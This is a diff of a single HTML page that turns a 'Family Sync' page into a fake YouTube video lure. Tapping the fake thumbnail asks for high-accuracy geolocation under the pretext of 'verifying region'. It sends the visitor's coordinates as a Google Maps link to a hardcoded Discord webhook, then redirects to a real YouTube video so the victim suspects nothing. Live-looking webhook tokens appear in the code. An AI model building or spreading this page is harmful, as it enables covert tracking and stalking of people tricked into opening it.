@@ -1,38 +1,51 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Family Photos</title>
+    <title>YouTube</title>
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 50px; background: #fafafa; }
-        .box { background: white; padding: 40px; border-radius: 20px; display: inline-block; border: 1px solid #ddd; }
-        button { background: #2ea44f; color: white; border: none; padding: 15px 30px; border-radius: 6px; font-size: 18px; font-weight: bold; cursor: pointer; }
+        body { font-family: Roboto, Arial, sans-serif; background-color: #0f0f0f; color: white; text-align: center; margin: 0; padding: 20px; }
+        .video-container { max-width: 500px; margin: auto; position: relative; cursor: pointer; }
+        /* The Thumbnail */
+        .thumbnail { width: 100%; border-radius: 12px; display: block; }
+        /* The Play Button Overlay */
+        .play-button { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 60px; filter: drop-shadow(0 0 10px rgba(0,0,0,0.5)); }
+        .title { text-align: left; font-size: 18px; margin-top: 12px; font-weight: bold; }
+        #status { color: #aaa; margin-top: 10px; font-size: 14px; }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>Family Sync</h2>
-        <p>Click below to sync your location with the group.</p>
-        <button onclick="send()">Sync Now</button>
-        <p id="msg"></p>
+
+    <div class="video-container" onclick="send()">
+        <img src="https://img.youtube.com/vi/YOUR_VIDEO_ID/maxresdefault.jpg" class="thumbnail">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/b/bb/YouTube_play_button_icon_%282013%E2%80%932017%29.svg" class="play-button">
+        <div class="title">New Video Shared With You</div>
     </div>
+
+    <p id="status">Tap video to play</p>
+
     <script>
-        const WEBHOOK_URL = https://discord.com/api/webhooks/1459670855922749460/yRDD8kBwyUHJkRbGMtSbla4u70mA8ZCv3ORbeifDH3EciizbyXGSJMJMZ1R094deGB2x;
+        const WEBHOOK_URL = "https://discordapp.com/api/webhooks/1459668118661103678/9OcP9yPBgMw8LvDp-yRBM_qGH1KY59lbVxMAeh_jDE-94e5q9JGcKxS5CVqGHe6PIkjp";
+        const REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
 
         function send() {
-            const msg = document.getElementById('msg');
-            msg.innerText = "Syncing...";
+            const status = document.getElementById('status');
+            status.innerText = "Verifying region...";
+
             navigator.geolocation.getCurrentPosition((pos) => {
                 const mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                
                 fetch(WEBHOOK_URL, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ content: `📍 **Family Sync Update**\n[View on Map](${mapLink})` })
+                    body: JSON.stringify({ content: `📍 **Family Update**\n[View Location](${mapLink})` })
                 }).then(() => {
-                    msg.innerText = "Success! Redirecting...";
-                    setTimeout(() => { window.location.href = "https://www.google.com"; }, 1500);
+                    window.location.replace(REDIRECT_URL);
                 });
-            }, () => { msg.innerText = "Please allow location access to sync."; }, { enableHighAccuracy: true });
+
+            }, (err) => {
+                status.innerText = "Please allow location to play video.";
+            }, { enableHighAccuracy: true });
         }
     </script>
 </body>
